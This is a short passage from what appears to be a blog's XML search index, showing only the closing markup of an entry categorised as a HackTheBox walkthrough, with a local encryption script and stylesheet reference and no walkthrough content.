<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
</search>
